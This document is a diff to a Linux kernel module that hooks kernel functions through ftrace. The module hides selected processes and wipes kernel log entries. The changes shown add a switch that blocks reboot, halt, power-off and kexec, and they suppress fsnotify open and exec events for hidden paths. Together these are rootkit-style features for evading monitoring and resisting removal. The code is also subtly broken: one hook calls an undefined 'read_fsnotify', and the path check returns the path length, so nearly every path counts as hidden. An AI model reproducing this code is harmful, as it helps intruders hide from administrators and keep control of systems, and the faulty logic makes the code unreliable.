@@ -29,6 +29,9 @@
 #include <linux/audit.h>
 #include <linux/string.h>
 #include <linux/kprobes.h>
+#include <linux/reboot.h>
+#include <linux/fsnotify_backend.h>
+#include <linux/version.h>
 #include "ftrace_hook.h"
 
 
@@ -87,6 +90,10 @@ module_param(hidden_base_exe, int, 0644);
 
 static int force_modules_disabled = 0;
 module_param(force_modules_disabled, int, 0644);
+
+//disable RESTART HALT POWER_OFF KEXEC RESTART2
+static int force_reboot_disabled = 0;
+module_param(force_reboot_disabled, int, 0644);
 
 #define MAX_NUM_PROC_NAME 10
 static int num_proc_name = 1;
@@ -840,11 +847,11 @@ static void clear_klog(void)
 {
 	u64 seq;
 	u32 idx;
-
-	//u64 sum_seq = 0;
-	//u32 sum_idx = 0;
-	//int flag = 0;
-
+#if 0
+	u64 sum_seq = 0;
+	u32 sum_idx = 0;
+	int flag = 0;
+#endif
 	logbuf_lock_irq();      
 	seq = *p_clear_seq;
 	idx = *p_clear_idx;
@@ -866,12 +873,12 @@ static void clear_klog(void)
 					msg->len = 0;
 				}
 			}
-		#if 0
+#if 0
 		} else {
 			sum_seq++;
 			sum_idx += msg->len;
 		}
-		#endif
+#endif
 	}
 
 #if 0
@@ -880,7 +887,6 @@ static void clear_klog(void)
 	if (*p_log_next_idx > sum_idx)
 		*p_log_next_idx -= sum_idx;
 #endif
-
 	logbuf_unlock_irq();      
 }
 
@@ -902,6 +908,30 @@ static asmlinkage long ftrace_security_task_getsid(struct pt_regs *regs)
 {
 	return real_security_task_getsid(regs);
 }
+
+static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
+static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
+{
+	return real_reboot_pid_ns(pid_ns, cmd);
+}
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
+static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
+static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
+{
+	return real___fsnotify_parent(path, dentry, mask);
+}
+
+static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
+             const struct qstr *file_name, u32 cookie) = NULL;
+static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
+             const struct qstr *file_name, u32 cookie)
+{
+	
+	return read_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
+} 
+#endif
+
 #else
 
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
@@ -950,12 +980,90 @@ static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
 
 	return real_security_task_getsid(p);
 }
+
+static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
+static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
+{
+	if (force_reboot_disabled) {
+		if (cmd == LINUX_REBOOT_CMD_RESTART2
+			|| cmd == LINUX_REBOOT_CMD_RESTART
+			|| cmd == LINUX_REBOOT_CMD_POWER_OFF
+			|| cmd == LINUX_REBOOT_CMD_HALT
+			|| cmd == LINUX_REBOOT_CMD_KEXEC)
+			return -EPERM;
+	}
+
+	return real_reboot_pid_ns(pid_ns, cmd);
+}
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
+
+static int is_hidden_path(const struct path *path)
+{
+	char *path_buf = NULL;
+	char *p = NULL;
+	int ret = 0;
+
+	if (!path)
+		goto end;
+
+	path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
+	if (!path_buf) 
+		goto end;
+
+	p = d_path(path, path_buf, PATH_MAX - 1);
+	if (IS_ERR_OR_NULL(p)) 
+		goto end;
+		
+	ret = strlen(p);
+	memmove(path_buf, p, ret);
+	path_buf[ret] = '\0';
+
+	if (is_hidden_proc_name(path_buf, PATH_MAX)) 
+		ret = 1;
+
+end:
+	if (path_buf)
+		kfree(path_buf);	
+	return ret;
+}
+
+static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
+static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
+{
+	if (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM)) 
+		if (is_hidden_path(path))
+			return 0;
+
+	return real___fsnotify_parent(path, dentry, mask);
+}
+
+static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
+             const struct qstr *file_name, u32 cookie) = NULL;
+static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
+             const struct qstr *file_name, u32 cookie)
+{
+	if (data_is == FSNOTIFY_EVENT_PATH 
+		&& (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM))) { 
+		if (is_hidden_path((const struct path *)data))
+			return 0;
+	}
+	
+	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
+} 
+
+#endif
 #endif
 
 static struct ftrace_hook hooks[] = {
         HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
         HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
         HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
+        HOOK("reboot_pid_ns", ftrace_reboot_pid_ns, &real_reboot_pid_ns),
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
+        HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
+        HOOK("fsnotify", ftrace_fsnotify, &real_fsnotify),
+#endif
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
